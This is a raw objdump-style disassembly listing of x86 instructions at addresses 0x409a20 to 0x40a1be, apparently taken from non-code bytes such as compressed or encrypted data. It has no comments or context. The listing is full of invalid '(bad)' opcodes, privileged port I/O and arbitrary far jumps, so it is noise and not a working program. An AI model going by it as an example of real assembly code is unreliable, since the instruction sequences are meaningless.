  409a20:	and    DWORD PTR [edx+0x5d],eax
  409a23:	pop    edx
  409a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a25:	push   es
  409a26:	popa   
  409a27:	xchg   ebp,eax
  409a28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a29:	int3   
  409a2a:	mov    dl,BYTE PTR [ebp+0x66]
  409a2d:	dec    esi
  409a2e:	int    0x6d
  409a30:	test   eax,0xce9b5033
  409a35:	dec    edx
  409a36:	add    BYTE PTR [edi-0x76],cl
  409a39:	mov    ds:0xf1f5cf2,al
  409a3e:	je     0x409a26
  409a40:	stos   DWORD PTR es:[edi],eax
  409a41:	mov    dh,0x51
  409a43:	sbb    BYTE PTR [ebx-0x741ee088],cl
  409a49:	pop    edi
  409a4a:	jecxz  0x409a1b
  409a4c:	inc    ebx
  409a4d:	shl    DWORD PTR [edi+0x5e659133],0x11
  409a54:	(bad)  
  409a55:	retf   0x9bd7
  409a58:	mov    eax,ds:0xe0306bdf
  409a5d:	xchg   ebp,eax
  409a5e:	and    DWORD PTR [ebx],0xd1d287
  409a64:	inc    ebp
  409a65:	xor    eax,DWORD PTR [ebx+0x74]
  409a68:	addr16 pop edi
  409a6a:	iretw  
  409a6c:	(bad)  
  409a6e:	xchg   ebx,eax
  409a6f:	or     edx,ebp
  409a71:	sub    al,0x91
  409a73:	xlat   BYTE PTR ds:[ebx]
  409a74:	and    ch,BYTE PTR [ebp-0x67]
  409a77:	mov    eax,ds:0x7c6b259b
  409a7c:	jb     0x409a73
  409a7e:	mov    ecx,DWORD PTR [esi-0x1bf2bd60]
  409a84:	nop
  409a85:	int    0xbf
  409a87:	sub    DWORD PTR [ebx+0x5e],edx
  409a8a:	push   esp
  409a8b:	sti    
  409a8c:	mov    eax,0x7118dee7
  409a91:	or     al,0x67
  409a93:	in     eax,dx
  409a94:	xor    bh,BYTE PTR [edi]
  409a96:	out    dx,al
  409a97:	sub    esi,DWORD PTR ds:0x99de34ed
  409a9d:	sar    dl,cl
  409a9f:	mov    bl,0x80
  409aa1:	repnz out 0x7b,eax
  409aa4:	mov    edx,0x8abda5
  409aa9:	pop    ds
  409aaa:	xlat   BYTE PTR ds:[ebx]
  409aab:	mov    cs,WORD PTR [esi-0x2e]
  409aae:	lods   eax,DWORD PTR ds:[esi]
  409aaf:	repz inc esp
  409ab1:	imul   edi,DWORD PTR [ebx+0x2a],0x568984d4
  409ab8:	xchg   ebx,eax
  409ab9:	pusha  
  409aba:	sbb    eax,ebx
  409abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409abd:	push   ds
  409abe:	and    bl,dl
  409ac0:	sub    bh,BYTE PTR [ecx]
  409ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ac3:	data16 jne 0x409b20
  409ac6:	sbb    BYTE PTR [ecx],dh
  409ac8:	mov    cs,WORD PTR [ecx]
  409aca:	cmp    al,0x90
  409acc:	std    
  409acd:	aam    0x80
  409acf:	neg    BYTE PTR [edi-0x64cdc89e]
  409ad5:	mov    cl,0x33
  409ad7:	ss jns 0x409a7d
  409ada:	add    dh,BYTE PTR [esi+0x31]
  409add:	mov    edx,0x26cf09a4
  409ae2:	pop    ss
  409ae3:	mov    al,ds:0xb3263e05
  409ae8:	or     BYTE PTR [ebx+0xd],cl
  409aeb:	je     0x409b21
  409aed:	cdq    
  409aee:	jne    0x409b03
  409af0:	call   0xdeded494
  409af5:	je     0x409b72
  409af7:	leave  
  409af8:	dec    edx
  409af9:	test   BYTE PTR [ebx+0x37],dl
  409afc:	xlat   BYTE PTR ds:[ebx]
  409afd:	cwde   
  409afe:	aaa    
  409aff:	fild   QWORD PTR [edx-0x74]
  409b02:	fucomi st,st(2)
  409b04:	pop    edi
  409b05:	mov    ebp,0xf4289cbf
  409b0a:	sbb    dl,BYTE PTR [ecx-0x21544187]
  409b10:	(bad)  
  409b11:	mov    esp,0x975aaa1f
  409b16:	add    BYTE PTR [edi-0x2d],cl
  409b19:	mul    DWORD PTR [eax]
  409b1b:	inc    eax
  409b1c:	cmp    bl,BYTE PTR [ecx]
  409b1e:	inc    eax
  409b1f:	out    0x5c,eax
  409b21:	into   
  409b22:	cmp    esi,ebx
  409b24:	inc    edx
  409b25:	jmp    0x7f0:0xcaa5fd3c
  409b2c:	jg     0x409ade
  409b2e:	test   BYTE PTR [ebp+0x5a],dl
  409b31:	mov    ch,0x92
  409b33:	lahf   
  409b34:	inc    edx
  409b35:	int    0x80
  409b37:	or     ebp,esi
  409b39:	and    eax,0xb6d509e5
  409b3e:	mov    ebp,0xe6772241
  409b43:	xor    ch,bl
  409b45:	xor    bh,BYTE PTR cs:[ebp+0x223417a2]
  409b4c:	sub    al,0x7c
  409b4e:	dec    esi
  409b4f:	mov    edi,0xe4791df3
  409b54:	adc    ah,bl
  409b56:	sub    cl,BYTE PTR [esi+0x7eb9f548]
  409b5c:	mov    WORD PTR [esi+0x68bc2675],es
  409b62:	add    ecx,edx
  409b64:	jmp    0xcf5:0x33f4cac0
  409b6b:	test   BYTE PTR ds:0x42fc3808,dh
  409b71:	test   eax,0xa444217e
  409b76:	ins    BYTE PTR es:[edi],dx
  409b77:	push   edx
  409b78:	cmp    bl,dh
  409b7a:	enter  0x1e17,0xda
  409b7e:	xor    DWORD PTR [eax-0x6e],esp
  409b81:	ror    DWORD PTR [esi+0x14],cl
  409b84:	mov    ds:0x7804778f,al
  409b89:	mov    ?,WORD PTR [ebx+0x7]
  409b8c:	shr    BYTE PTR [ecx],cl
  409b8e:	jecxz  0x409bda
  409b90:	icebp  
  409b91:	jge    0x409be3
  409b93:	sbb    al,0xb
  409b95:	add    eax,DWORD PTR [ecx]
  409b97:	inc    ebp
  409b98:	out    dx,al
  409b99:	lods   al,BYTE PTR ds:[esi]
  409b9a:	add    DWORD PTR [edi+0x66],0x709e7458
  409ba1:	out    0x34,al
  409ba3:	sar    BYTE PTR [eax-0x50],1
  409ba6:	cmp    ebx,DWORD PTR [eax-0x67]
  409ba9:	in     al,0x45
  409bab:	mov    ah,0x35
  409bad:	push   ss
  409bae:	sbb    al,cl
  409bb0:	push   eax
  409bb1:	dec    ebp
  409bb2:	mov    esi,DWORD PTR [edi]
  409bb4:	retf   
  409bb5:	jecxz  0x409b3c
  409bb7:	dec    edx
  409bb8:	(bad)  
  409bb9:	stc    
  409bba:	sbb    BYTE PTR [ebx-0x6c],ch
  409bbd:	push   esi
  409bbe:	sahf   
  409bbf:	push   edi
  409bc0:	jge    0x409c3d
  409bc2:	xor    DWORD PTR [eax+0x2a],ecx
  409bc5:	test   eax,0xa87572a5
  409bca:	pop    ebx
  409bcb:	cmp    al,0x78
  409bcd:	sbb    DWORD PTR [ebx-0x170632c9],eax
  409bd3:	(bad)  
  409bd4:	daa    
  409bd5:	pop    esp
  409bd6:	cli    
  409bd7:	in     eax,dx
  409bd8:	adc    al,0x71
  409bda:	imul   edx,ebx,0xffffff91
  409bdd:	(bad)
  409be0:	xchg   ecx,eax
  409be1:	push   ds
  409be2:	(bad)  
  409be3:	sub    BYTE PTR [ecx-0x77],al
  409be6:	sbb    al,0x23
  409be8:	jns    0x409bd1
  409bea:	pusha  
  409beb:	loope  0x409b7a
  409bed:	pop    ebp
  409bee:	sub    BYTE PTR [ebp+0x51],bh
  409bf1:	jbe    0x409bd7
  409bf3:	jl     0x409b93
  409bf5:	aad    0xc3
  409bf7:	push   esi
  409bf8:	pushf  
  409bf9:	test   ebp,edx
  409bfb:	aam    0xeb
  409bfd:	pop    esp
  409bfe:	mov    cl,0xa0
  409c00:	sbb    dh,BYTE PTR [edi-0x63aa8774]
  409c06:	ins    DWORD PTR es:[edi],dx
  409c07:	outs   dx,BYTE PTR ds:[esi]
  409c08:	in     eax,0xc7
  409c0a:	cld    
  409c0b:	lds    ecx,FWORD PTR [ecx-0x5b8f45a5]
  409c11:	out    0x4e,al
  409c13:	mov    edi,DWORD PTR [ebp+0x2c]
  409c16:	and    BYTE PTR [esi-0x32634c70],bh
  409c1c:	xchg   edx,eax
  409c1d:	mov    dl,0x97
  409c1f:	jmp    0x8576:0x7da584fb
  409c26:	pop    esp
  409c27:	dec    ebp
  409c28:	rcr    BYTE PTR [edi-0x13],cl
  409c2b:	dec    eax
  409c2c:	sub    ebp,DWORD PTR [edi+edi*2-0x7c]
  409c30:	adc    al,0xfe
  409c32:	push   0xffffffad
  409c34:	stos   DWORD PTR es:[edi],eax
  409c35:	or     eax,0xfac81496
  409c3a:	dec    ebp
  409c3b:	mov    WORD PTR [ecx],cs
  409c3d:	loop   0x409be2
  409c3f:	scas   eax,DWORD PTR es:[edi]
  409c40:	mov    esi,0x29a4f857
  409c45:	into   
  409c46:	sbb    eax,0xeae79d9e
  409c4b:	imul   BYTE PTR [edx+ecx*2+0x1d]
  409c4f:	lds    ebp,FWORD PTR [ecx-0x22e89386]
  409c55:	enter  0xe0e3,0x9e
  409c59:	pop    ds
  409c5a:	imul   ecx,DWORD PTR [esi+0x43],0x66621b59
  409c61:	(bad)  [ecx+0x5c]
  409c64:	mov    ebp,0xf019f4f9
  409c69:	out    dx,eax
  409c6a:	div    BYTE PTR [esp+edx*4+0x1e]
  409c6e:	push   ds
  409c6f:	add    eax,0xb467e1e5
  409c74:	adc    bl,BYTE PTR [ecx+0x79bf3fbc]
  409c7a:	mov    esp,0x15ceb42c
  409c7f:	jo     0x409cd0
  409c81:	fsubp  st(2),st
  409c83:	sub    esp,DWORD PTR ds:[ebp-0x739f6d4d]
  409c8a:	add    ax,0xefd5
  409c8e:	pop    es
  409c8f:	add    BYTE PTR [ecx+0x5da91685],ah
  409c95:	jmp    0x403a:0xc0a4a30e
  409c9c:	pusha  
  409c9d:	or     esi,ecx
  409c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ca0:	xor    ecx,edi
  409ca2:	pop    esi
  409ca3:	push   0xfffffff2
  409ca5:	push   edi
  409ca6:	arpl   WORD PTR [eax+0x42609d06],ax
  409cac:	cmp    eax,0x3f25e8ea
  409cb1:	or     dh,0x41
  409cb4:	sahf   
  409cb5:	out    dx,eax
  409cb6:	in     eax,dx
  409cb7:	stos   BYTE PTR es:[edi],al
  409cb8:	call   0x9dadd776
  409cbd:	aas    
  409cbe:	rcl    DWORD PTR [edi-0x41],0xa1
  409cc2:	adc    cl,BYTE PTR [ebx]
  409cc4:	sbb    al,0xec
  409cc6:	loop   0x409ca1
  409cc8:	mov    ecx,0xf3e9e2ac
  409ccd:	xlat   BYTE PTR ds:[ebx]
  409cce:	mov    bh,0xc0
  409cd0:	push   ebp
  409cd1:	pop    eax
  409cd2:	push   0xffffffde
  409cd4:	or     BYTE PTR [ecx],0xf6
  409cd7:	dec    edi
  409cd8:	or     al,0x8
  409cda:	pop    ebp
  409cdb:	jno    0x409d54
  409cdd:	fidivr WORD PTR [edi-0x2cc5dbbf]
  409ce3:	out    dx,al
  409ce4:	or     DWORD PTR [ebx-0x5c],eax
  409ce7:	pushf  
  409ce8:	mov    ds:0xf3eae6b1,al
  409ced:	ret    0x5c89
  409cf0:	push   0x2f2b9f72
  409cf5:	je     0x409cbf
  409cf7:	jle    0x409d11
  409cf9:	sar    DWORD PTR [eax],1
  409cfb:	(bad)  
  409cfc:	call   0xb39382be
  409d01:	es loop 0x409d18
  409d04:	in     eax,dx
  409d05:	jmp    0x1d59:0x77dd4775
  409d0c:	(bad)  
  409d0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d0e:	pop    ss
  409d0f:	ja     0x409cf9
  409d11:	inc    edx
  409d12:	std    
  409d13:	cwde   
  409d14:	rcl    DWORD PTR [edi-0x4f],cl
  409d17:	aam    0x41
  409d19:	adc    al,0xcb
  409d1b:	mov    al,ds:0xd72c5566
  409d20:	jecxz  0x409d8f
  409d22:	inc    edi
  409d23:	dec    esi
  409d24:	xchg   DWORD PTR [edi-0x56],ebx
  409d27:	loope  0x409d45
  409d29:	es mul ecx
  409d2c:	add    DWORD PTR [ebp+0x2e],ecx
  409d2f:	xchg   ebx,eax
  409d30:	in     al,0x86
  409d32:	frstpm(287 only) 
  409d34:	popf   
  409d35:	ret    0x2c3a
  409d38:	mov    al,ds:0x55cca18c
  409d3d:	mov    ebp,0x10a9bae
  409d42:	in     eax,dx
  409d43:	mov    dl,0x24
  409d45:	inc    edi
  409d46:	inc    ebx
  409d47:	ins    DWORD PTR es:[edi],dx
  409d48:	mov    edi,0x296ce9d0
  409d4d:	sub    BYTE PTR [ebp-0x63],dl
  409d50:	out    0x35,al
  409d52:	cmp    al,0xf1
  409d54:	dec    esp
  409d55:	fld    QWORD PTR [edi-0x30]
  409d58:	xor    eax,0x53f44605
  409d5d:	jle    0x409d37
  409d5f:	in     eax,0x2c
  409d61:	mov    eax,ds:0xae93a456
  409d66:	sbb    BYTE PTR [esi+0x7],bl
  409d69:	sbb    eax,esi
  409d6b:	sub    BYTE PTR [ebx-0x7f],bh
  409d6e:	lea    esp,[ebx-0x72874df6]
  409d74:	sub    dl,BYTE PTR [eax+eax*8-0x2249fbba]
  409d7b:	in     eax,dx
  409d7c:	dec    esp
  409d7d:	imul   ebx,DWORD PTR [edi+0x75c80e7f],0xffffffcf
  409d84:	je     0x409dff
  409d86:	mov    al,ds:0xd5a391f3
  409d8b:	push   es
  409d8c:	dec    esi
  409d8d:	sbb    al,0xec
  409d8f:	test   eax,0x1cc6af13
  409d94:	dec    edi
  409d95:	mov    WORD PTR [edx],gs
  409d97:	mov    edx,0xc4be4ebc
  409d9c:	push   ss
  409d9d:	cmp    BYTE PTR ds:0x65babc99,al
  409da3:	in     eax,0x19
  409da5:	js     0x409d4b
  409da7:	xor    DWORD PTR [ecx],esp
  409da9:	mov    ebp,DWORD PTR [edx-0x7b8f8ae6]
  409daf:	(bad)  
  409db0:	sar    BYTE PTR [eax+0x27],1
  409db3:	inc    edx
  409db4:	nop
  409db5:	jns    0x409e2c
  409db7:	in     al,0xce
  409db9:	mov    esp,gs
  409dbb:	inc    ebp
  409dbc:	jge    0x409dbc
  409dbe:	xchg   ecx,eax
  409dbf:	cld    
  409dc0:	or     edi,DWORD PTR [edx-0x80efbd]
  409dc6:	xchg   bh,ah
  409dc8:	int3   
  409dc9:	cs mov bl,0x28
  409dcc:	dec    ecx
  409dcd:	mov    al,0xa6
  409dcf:	clc    
  409dd0:	add    edx,esp
  409dd2:	jbe    0x409e36
  409dd4:	out    dx,al
  409dd5:	inc    edi
  409dd6:	xor    edx,DWORD PTR [edx-0x3f]
  409dd9:	jl     0x409d87
  409ddb:	(bad)  
  409ddc:	or     al,0x20
  409dde:	lock jmp 0xfd131d0c
  409de4:	sti    
  409de5:	mov    ds:0xe7a341d9,eax
  409dea:	xlat   BYTE PTR ds:[ebx]
  409deb:	mov    ah,BYTE PTR [edi]
  409ded:	inc    ebx
  409dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409def:	hlt    
  409df0:	jno    0x409e02
  409df2:	mov    DWORD PTR [ebx],ebx
  409df4:	lods   al,BYTE PTR ds:[esi]
  409df5:	pop    edx
  409df6:	call   0x2d26:0xf2375873
  409dfd:	sbb    eax,0x2da6028c
  409e02:	jne    0x409e6d
  409e04:	and    BYTE PTR [esp+ebp*1-0x6b0330b1],al
  409e0b:	cmp    DWORD PTR [ebx+ebx*1-0xd57716e],ebx
  409e12:	xor    cl,al
  409e14:	jb     0x409e7c
  409e16:	test   al,0x6a
  409e18:	imul   edx,DWORD PTR [edi+0x70],0xffffffce
  409e1c:	adc    DWORD PTR [ecx-0x79914d4e],ecx
  409e22:	or     DWORD PTR [eax+0x1db1915a],esp
  409e28:	sub    BYTE PTR [edi],ah
  409e2a:	fwait
  409e2b:	or     DWORD PTR [eax-0x767fb1f9],edx
  409e31:	out    dx,al
  409e32:	test   eax,0xfd49e98f
  409e37:	int    0xd9
  409e39:	sub    eax,0xdd7d608c
  409e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e3f:	pop    ecx
  409e40:	pop    ecx
  409e41:	rcl    dh,1
  409e43:	rcr    BYTE PTR [edx+edi*4-0x5d4ffa81],0x10
  409e4b:	or     al,0x40
  409e4d:	sar    BYTE PTR [esi],1
  409e4f:	aad    0x66
  409e51:	(bad)  
  409e52:	jecxz  0x409e0c
  409e54:	retf   
  409e55:	and    DWORD PTR [edi-0x25],0x9195981c
  409e5c:	mov    bh,0xcc
  409e5e:	push   edi
  409e5f:	sbb    al,0xb
  409e61:	sar    BYTE PTR [edx],0x4e
  409e64:	pusha  
  409e65:	ja     0x409eba
  409e67:	sbb    DWORD PTR [ecx+0x69],edi
  409e6a:	mov    ds,ebx
  409e6c:	int3   
  409e6d:	push   eax
  409e6e:	pop    ds
  409e6f:	mov    BYTE PTR fs:[edi-0x72],cl
  409e73:	int3   
  409e74:	loop   0x409ea7
  409e76:	loop   0x409e4f
  409e78:	test   BYTE PTR [eax+0x32cdd5c1],cl
  409e7e:	mov    es,WORD PTR es:[ebx-0x39c6a03]
  409e85:	xchg   ebx,eax
  409e86:	jb     0x409ec2
  409e88:	add    al,0xd4
  409e8a:	cs push eax
  409e8d:	add    BYTE PTR [ecx+edi*1-0x5f],ah
  409e91:	push   esi
  409e92:	dec    edx
  409e93:	loopne 0x409eba
  409e95:	neg    BYTE PTR [esi+0x41]
  409e98:	mov    ebx,0x7c69549c
  409e9d:	ficomp DWORD PTR [edx]
  409e9f:	das    
  409ea0:	and    eax,0x9de01d72
  409ea5:	dec    ecx
  409ea6:	inc    eax
  409ea7:	int3   
  409ea8:	cmc    
  409ea9:	loope  0x409eb7
  409eab:	inc    esi
  409eac:	adc    dl,BYTE PTR [edx+0x29]
  409eaf:	cmp    DWORD PTR [ecx],0x76
  409eb2:	add    eax,0x1cc80788
  409eb7:	adc    bh,BYTE PTR [ebx]
  409eb9:	jle    0x409e59
  409ebb:	jno    0x409eaa
  409ebd:	adc    ebx,DWORD PTR [eax+0x701b25f9]
  409ec3:	xchg   BYTE PTR [esi+0x37],ah
  409ec6:	mov    ebx,0x40818692
  409ecb:	sar    DWORD PTR [esi-0x4e806cb2],1
  409ed1:	sar    BYTE PTR [ecx-0x19],cl
  409ed4:	push   ss
  409ed5:	arpl   WORD PTR [ebx+0x1e9518c6],bp
  409edb:	sub    al,0xc3
  409edd:	xor    DWORD PTR [ecx],eax
  409edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ee0:	scas   eax,DWORD PTR es:[edi]
  409ee1:	fisttp WORD PTR [esi+0x52b5eb1b]
  409ee7:	fbld   TBYTE PTR [esi-0xe]
  409eea:	jmp    0x9b22b90e
  409eef:	scas   eax,DWORD PTR es:[edi]
  409ef0:	xor    bl,bh
  409ef2:	push   edx
  409ef3:	int3   
  409ef4:	fisub  DWORD PTR [ebp-0x213eee16]
  409efa:	dec    eax
  409efb:	aam    0xf4
  409efd:	and    DWORD PTR ds:0x7d87b4bd,esp
  409f03:	es dec edx
  409f05:	xchg   edi,eax
  409f06:	test   DWORD PTR [ecx+0x2c],eax
  409f09:	xlat   BYTE PTR ds:[ebx]
  409f0a:	inc    edi
  409f0b:	js     0x409efe
  409f0d:	lds    ebp,FWORD PTR [ebx+0x62ab0dee]
  409f13:	add    esp,edi
  409f15:	mov    DWORD PTR [ecx-0x607bcf63],esp
  409f1b:	xor    bl,ah
  409f1d:	aam    0xd2
  409f1f:	pop    es
  409f20:	mov    edx,0x3cb5bc75
  409f25:	adc    esp,DWORD PTR [ebx+0x2c]
  409f28:	cmp    BYTE PTR [ebx],bh
  409f2a:	dec    eax
  409f2b:	mov    eax,ds:0x4f33abcc
  409f30:	cmp    eax,DWORD PTR [ebx]
  409f32:	cli    
  409f33:	inc    ebx
  409f34:	fadd   QWORD PTR [ebx-0x2d0b80cb]
  409f3b:	(bad)  
  409f3c:	fisttp DWORD PTR [ecx+0x4]
  409f3f:	das    
  409f40:	and    al,0x6c
  409f42:	out    dx,eax
  409f43:	popf   
  409f44:	dec    ebx
  409f45:	stos   DWORD PTR es:[edi],eax
  409f46:	sar    DWORD PTR [ecx+ecx*1-0x28],0x89
  409f4b:	dec    edx
  409f4c:	aad    0xb9
  409f4e:	xor    BYTE PTR [esi+0x8],0x4
  409f52:	ins    DWORD PTR es:[edi],dx
  409f53:	lahf   
  409f54:	xlat   BYTE PTR ds:[ebx]
  409f55:	jecxz  0x409f1d
  409f57:	fsub   st,st(6)
  409f59:	shr    DWORD PTR [edx+0x52e46d83],1
  409f5f:	test   BYTE PTR [edi],bl
  409f61:	jo     0x409f89
  409f63:	aad    0x84
  409f65:	xor    ecx,0x78
  409f68:	(bad)  
  409f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f6a:	lods   eax,DWORD PTR ds:[esi]
  409f6b:	xor    DWORD PTR [ecx-0x7ec4bc6e],0x10
  409f72:	fld    TBYTE PTR [eax-0x42]
  409f75:	arpl   cx,di
  409f77:	repz test al,0x4a
  409f7a:	adc    al,0xe7
  409f7c:	mov    eax,DWORD PTR [edx-0x489a0e30]
  409f82:	or     bl,0xe8
  409f85:	sbb    eax,0x464f257
  409f8a:	push   0x1f
  409f8c:	jae    0x409fbd
  409f8e:	mov    ah,0x15
  409f90:	imul   ebp,DWORD PTR [eax],0x6b
  409f93:	loopne 0x409f5e
  409f95:	enter  0xcde4,0xf6
  409f99:	fsub   DWORD PTR [ecx-0x699dab6c]
  409f9f:	cdq    
  409fa0:	jne    0x409f9b
  409fa2:	xor    ecx,DWORD PTR [ebx-0x54d5201e]
  409fa8:	jae    0x409f52
  409faa:	pop    ecx
  409fab:	iret   
  409fac:	repz add cl,dl
  409faf:	cmp    BYTE PTR [ebx+ebp*2+0x12],ah
  409fb3:	sub    bl,cl
  409fb5:	out    0x12,al
  409fb7:	or     edi,eax
  409fb9:	mov    ah,BYTE PTR [edx-0x66]
  409fbc:	(bad)  
  409fbd:	fldcw  WORD PTR [esi-0x6a]
  409fc0:	jge    0x409fba
  409fc2:	jmp    0xbf93:0xdbbd6505
  409fc9:	xor    eax,0x43b1e1e0
  409fce:	sub    edx,DWORD PTR [edx-0x39]
  409fd1:	push   0x2
  409fd3:	pop    ebp
  409fd4:	mov    ebx,0x64460a95
  409fd9:	pop    esi
  409fda:	xchg   edx,eax
  409fdb:	xor    edx,DWORD PTR [edx]
  409fdd:	sbb    DWORD PTR [edx+ecx*4+0x67a81f93],ebp
  409fe4:	adc    ebx,DWORD PTR [eax+0x3b]
  409fe7:	mov    ah,0x56
  409fe9:	cmp    BYTE PTR [edi-0x6b],ah
  409fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fed:	imul   ebp,DWORD PTR [esi+0x4e],0x38
  409ff1:	in     al,dx
  409ff2:	mov    bh,0xfb
  409ff4:	pop    ds
  409ff5:	mov    eax,ds:0x2d734054
  409ffa:	imul   ebp,DWORD PTR [esi+0x2b],0x21e95105
  40a001:	adc    DWORD PTR [ebx+ecx*4],edx
  40a004:	jnp    0x409fc6
  40a006:	sub    BYTE PTR [eax+0x79],bl
  40a009:	mov    esi,0x38831b2
  40a00e:	pop    eax
  40a00f:	inc    ebx
  40a010:	lods   al,BYTE PTR ds:[esi]
  40a011:	push   edx
  40a012:	inc    esi
  40a013:	gs bound eax,QWORD PTR cs:[esi-0x64]
  40a018:	les    edi,FWORD PTR [esi]
  40a01a:	push   eax
  40a01b:	adc    BYTE PTR [ebx],bl
  40a01d:	jl     0x409fbc
  40a01f:	test   DWORD PTR [ebp-0x4ddffbd5],ecx
  40a025:	add    edx,DWORD PTR [ecx-0x11de1dc6]
  40a02b:	aam    0x79
  40a02d:	or     BYTE PTR [ecx-0x21],cl
  40a030:	in     eax,0xac
  40a032:	sbb    al,0x13
  40a034:	xchg   DWORD PTR ds:0x705ab031,eax
  40a03a:	dec    eax
  40a03b:	adc    al,0x6
  40a03d:	adc    esp,edx
  40a03f:	xchg   ebp,eax
  40a040:	and    ebp,ecx
  40a042:	push   ebp
  40a043:	jp     0x40a015
  40a045:	jno    0x409fef
  40a047:	gs mov cl,0x4d
  40a04a:	enter  0x21b9,0xe4
  40a04e:	scas   eax,DWORD PTR es:[edi]
  40a04f:	push   edx
  40a050:	es sbb ecx,DWORD PTR es:[bp+di]
  40a055:	hlt    
  40a056:	ds mov ch,0xcc
  40a059:	push   cs
  40a05a:	fcom   DWORD PTR [ebx]
  40a05c:	jle    0x40a084
  40a05e:	xlat   BYTE PTR ds:[ebx]
  40a05f:	cmp    DWORD PTR cs:[eax],ebp
  40a062:	call   0x69ad:0x80d73f
  40a069:	clc    
  40a06a:	rcl    DWORD PTR [edx+0x60],1
  40a06d:	mov    bl,0xe7
  40a06f:	push   ds
  40a070:	push   esi
  40a071:	dec    BYTE PTR [ecx+0x6e983b1e]
  40a077:	mov    ch,0xff
  40a079:	rcl    BYTE PTR [ebx-0x1cf7b3e8],1
  40a07f:	or     BYTE PTR [ecx-0x61],al
  40a082:	cmp    edx,DWORD PTR [ebp-0x6755ffa3]
  40a088:	dec    edi
  40a089:	iret   
  40a08a:	xlat   BYTE PTR ds:[ebx]
  40a08b:	call   0x5261c132
  40a090:	shl    esp,0xe0
  40a093:	lods   al,BYTE PTR ds:[esi]
  40a094:	dec    edx
  40a095:	lds    esi,FWORD PTR [ecx+0x5c84f430]
  40a09b:	jge    0x40a0b9
  40a09d:	arpl   WORD PTR [ebp+0x25d0ef60],si
  40a0a3:	mov    ebp,0xe56d6239
  40a0a8:	sub    al,0x4e
  40a0aa:	xchg   DWORD PTR [ebx-0x59],ecx
  40a0ad:	inc    ebx
  40a0ae:	xchg   DWORD PTR [edx],edx
  40a0b0:	test   al,cl
  40a0b2:	lahf   
  40a0b3:	out    dx,al
  40a0b4:	(bad)  
  40a0b5:	mov    al,ds:0xe62cee9b
  40a0ba:	js     0x40a06b
  40a0bc:	imul   edi,DWORD PTR [edx-0x4c],0x83a8e630
  40a0c3:	shl    DWORD PTR ds:[edi-0x2b7a7d0e],cl
  40a0ca:	or     esi,DWORD PTR [ebp+ebp*1-0x7a8639ca]
  40a0d1:	cwde   
  40a0d2:	adc    ebp,DWORD PTR [ecx+esi*4+0x14]
  40a0d6:	in     eax,dx
  40a0d7:	out    dx,al
  40a0d8:	jp     0x40a10f
  40a0da:	out    0x40,eax
  40a0dc:	ret    
  40a0dd:	push   esp
  40a0de:	cmp    eax,0x1d45a131
  40a0e3:	cld    
  40a0e4:	imul   ebp,DWORD PTR [esi-0x28f633e6],0x37c7d613
  40a0ee:	jb     0x40a080
  40a0f0:	xor    esi,esi
  40a0f2:	ds inc ebx
  40a0f4:	pop    ebx
  40a0f5:	out    0xfe,eax
  40a0f7:	icebp  
  40a0f8:	dec    esp
  40a0f9:	xor    BYTE PTR [esi],bh
  40a0fb:	sbb    DWORD PTR [esi+esi*8],edi
  40a0fe:	mov    ebx,0x2448ec4d
  40a103:	dec    ebx
  40a104:	dec    edi
  40a105:	out    0x45,al
  40a107:	adc    ebp,ebp
  40a109:	jge    0x40a09a
  40a10b:	add    eax,0x657048a2
  40a110:	iret   
  40a111:	or     BYTE PTR [ebx+edx*2+0xd],0x63
  40a116:	jbe    0x40a10f
  40a118:	outs   dx,DWORD PTR ds:[esi]
  40a119:	popf   
  40a11a:	lods   eax,DWORD PTR ds:[esi]
  40a11b:	jnp    0x40a0bf
  40a11d:	add    al,0x5c
  40a11f:	sub    DWORD PTR [edi-0x158c7641],eax
  40a125:	and    DWORD PTR [edx+ebp*8-0x7c03288],0x4946a3b5
  40a130:	jle    0x40a13f
  40a132:	popf   
  40a133:	jne    0x40a0db
  40a135:	enter  0x1e27,0x6a
  40a139:	fld    DWORD PTR [edi+0x5e]
  40a13c:	mov    ch,0x9
  40a13e:	into   
  40a13f:	mov    fs,WORD PTR [edx+0x7d5bfc25]
  40a145:	or     eax,0x5465cca9
  40a14a:	pop    ecx
  40a14b:	adc    al,0xa4
  40a14d:	xchg   ebx,eax
  40a14e:	test   BYTE PTR [ecx],bl
  40a150:	cmp    BYTE PTR [edx-0x65],bh
  40a153:	jae    0x40a17e
  40a155:	inc    edx
  40a156:	add    bl,BYTE PTR [edx-0x12]
  40a159:	jp     0x40a0de
  40a15b:	adc    al,0x40
  40a15d:	nop
  40a15e:	xor    eax,0xe96e0fa7
  40a163:	adc    al,BYTE PTR ds:0x9a52b992
  40a169:	iret   
  40a16a:	out    0x51,eax
  40a16c:	pop    ecx
  40a16d:	xor    ah,ah
  40a16f:	xor    eax,0xf831d30b
  40a174:	mov    WORD PTR [edx+0x4b90b22c],fs
  40a17a:	loop   0x40a1d6
  40a17c:	xor    DWORD PTR [edx+0x1038e05a],ecx
  40a182:	xchg   esp,eax
  40a183:	adc    DWORD PTR [esi+edx*8+0x75],ebp
  40a187:	fst    DWORD PTR [edx]
  40a189:	jle    0x40a1d1
  40a18b:	jg     0x40a178
  40a18d:	call   0x2a6d:0xb997c0d0
  40a194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a195:	and    al,0x72
  40a197:	and    DWORD PTR [ecx+0x499f1288],ebx
  40a19d:	hlt    
  40a19e:	popa   
  40a19f:	scas   eax,DWORD PTR es:[edi]
  40a1a0:	dec    ebp
  40a1a1:	add    eax,0xdcbadbc3
  40a1a6:	call   0x5c58406
  40a1ab:	mov    WORD PTR [edi+0x7d07474],?
  40a1b1:	dec    esi
  40a1b2:	icebp  
  40a1b3:	sbb    bl,BYTE PTR [ebx]
  40a1b5:	inc    ebp
  40a1b6:	scas   al,BYTE PTR es:[edi]
  40a1b7:	mov    dl,0x47
  40a1b9:	ss pop es
  40a1bb:	sti    
  40a1bc:	push   ds
  40a1bd:	(bad)  
  40a1be:	jmp    0xab6157ae
